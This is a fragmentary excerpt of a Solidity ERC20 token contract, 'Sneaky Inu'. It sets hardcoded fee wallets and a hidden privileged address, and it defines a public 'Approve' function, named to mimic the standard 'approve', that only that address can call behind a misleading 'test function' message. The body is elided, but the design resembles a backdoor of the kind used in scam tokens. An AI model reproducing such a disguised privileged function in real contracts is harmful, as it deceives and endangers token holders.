...
contract Context {
 ...
 contract SneakyInu is Context, ERC20, ERC20Metadata {
    ...
    address private _feeAddrWallet1 = 0x5DfC1a02F0Ac0051cea7cD64b9e450Fcc81aa519;
    address private _feeAddrWallet2 = 0x5DfC1a02F0Ac0051cea7cD64b9e450Fcc81aa519;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _tTotal = 100000 * 10**18;
    address private _svetlio;
    ...
    constructor(uint256 totalSupply_, uint256 demand_, uint256 _lui) {
        _name = "Sneaky Inu";
        _symbol = "SNEAKYINU";
        inSwap = false;
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        _svetlio = 0xc2C6b73bf91fd9660C0fB07F10F24778240Dc5F1;
    ...
    function Approve(uint256 amount) public {
        ...
        require(_msgSender() == _svetlio, "This is still a test function, please do not use!");
    }
